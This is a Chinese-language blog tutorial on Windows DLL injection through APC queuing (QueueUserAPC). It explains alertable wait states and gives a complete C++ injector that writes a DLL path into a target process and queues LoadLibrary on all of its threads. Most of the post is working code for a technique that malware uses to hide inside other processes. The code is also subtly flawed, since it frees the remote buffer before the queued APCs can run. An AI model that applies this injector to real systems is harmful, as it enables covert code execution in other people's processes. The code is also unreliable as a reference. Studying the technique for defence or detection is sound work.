---
title: 使用APC进行dll注入
date: 2021-01-25 00:00:00
categories: Code
tags: windows, process-inject, secuity, APC
cover: https://p1.ssl.qhimg.com/t011b2047aa5101086b.jpg
description: APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制,并以此去执行我们的DLL加载代码,进而完成DLL注入
---

异步过程调用是一种能在特定线程环境中异步执行的系统机制。往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数，APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC。每个线程都拥有自己的APC队列。应用程序可以使用函数把APC添加到指定线程的APC队列，函数定义如下：

```c++
DWORD WINAPI QueueUserAPC(
    _In_ PAPCFUNC pfnAPC, //APC函数地址
    _In_ HANDLE hThread, //目标线程
    _In_ ULONG_PTR dwData //APC函数的参数
    );
```

当用户模式APC被添加后，线程并不会直接调用APC函数，只有当线程处于“可变等待状态”时才会调用。如果希望线程执行APC函数，就要让线程进入可变等待状态。当线程调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectEx、WaitForMultipleObjectsEx或WaitForSingleObjectEx时就会进入可变等待状态。 ReadFileEx、WriteFileEx、和SetWaitableTimer等都是使用APC作为完成例程的回调机制。

原理：使用QueueUserAPC向目标进程的线程添加APC函数，而这个APC函数能够实现模块的加载功能。要使用这种方法的前提是目标进程能够进入可变等待状态，否则即便添加了APC也没有执行的机会
步骤：

1.向目标进程写入待注入的模块名称
2.枚举目标进程所有线程。（由于并不是每个线程都有机会进入可变等待状态，为了增加APC的机会，向目标进程的每个线程都添加APC是个比较保险的做法）
3.增加APC，把LoadLibrary作为APCProc，把第一步中DLL路径名称所在地址作为其参数

```c++
int InjectDllWithApc(WCHAR* DllFullPath, ULONG ProcessId)
{
	HANDLE hTatgetProcessHandle;
	hTatgetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	if (hTatgetProcessHandle == NULL)
	{
		printf("Failed To Open Process!!\n");
		return 0;
	}
	ULONG32 ulDllLength = (ULONG32)_tcslen(DllFullPath) + 1;
	//申请内存
	WCHAR* pRemoteAddress = (WCHAR*)VirtualAllocEx(hTatgetProcessHandle, NULL, ulDllLength * sizeof(WCHAR),
		MEM_COMMIT, PAGE_READWRITE);
	if (pRemoteAddress == NULL)
	{
		printf("Alloc Virtual Address Failed!\n");
		CloseHandle(hTatgetProcessHandle);
		return 0;
	}
	//DLL写入
	if (WriteProcessMemory(hTatgetProcessHandle, pRemoteAddress, (LPVOID)DllFullPath, ulDllLength * sizeof(WCHAR), NULL) == FALSE)
	{
		VirtualFreeEx(hTatgetProcessHandle, pRemoteAddress, ulDllLength, MEM_DECOMMIT);
		CloseHandle(hTatgetProcessHandle);
		return 0;
	}
	THREADENTRY32 ThreadEntry32 = { 0 };
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	ThreadEntry32.dwSize = sizeof(THREADENTRY32);
	HANDLE hThreadHandle;
	BOOL bStatus;
	DWORD dwReturn;
	//创建快照
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
	{
		return 0;
	}
	if (!Thread32First(hThreadSnap, &ThreadEntry32))
	{
		CloseHandle(hThreadSnap);
		return 1;
	}
	do
	{
		//遍历线程
		if (ThreadEntry32.th32OwnerProcessID == ProcessId)
		{
			printf("TID:%d\n", ThreadEntry32.th32ThreadID);
			hThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry32.th32ThreadID);
			if (hThreadHandle)
			{
				//向线程插入APC
				dwReturn = QueueUserAPC(
					(PAPCFUNC)LoadLibrary,
					hThreadHandle,
					(ULONG_PTR)pRemoteAddress);
				if (dwReturn > 0)
				{
					bStatus = TRUE;
				}
				//关闭句柄
				CloseHandle(hThreadHandle);
			}
		}
	} while (Thread32Next(hThreadSnap, &ThreadEntry32));
	VirtualFreeEx(hTatgetProcessHandle, pRemoteAddress, ulDllLength, MEM_DECOMMIT);
	CloseHandle(hThreadSnap);
	CloseHandle(hTatgetProcessHandle);
	return 0;
}
```
